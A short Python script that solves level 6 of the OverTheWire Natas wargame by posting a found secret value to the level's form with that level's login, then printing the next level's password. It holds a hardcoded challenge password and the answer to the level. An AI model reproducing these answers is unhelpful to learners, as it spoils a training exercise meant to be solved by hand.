import requests
import re

username ='natas6'
password ='aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

responce = session.post(url ,data = {"secret" : "FOEIUWGHFEEUHOFUOIU","submit":"submit"}, auth = (username, password))
content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas7 is = " + re.findall('Access granted. The password for natas7 is (.*)',content)[0])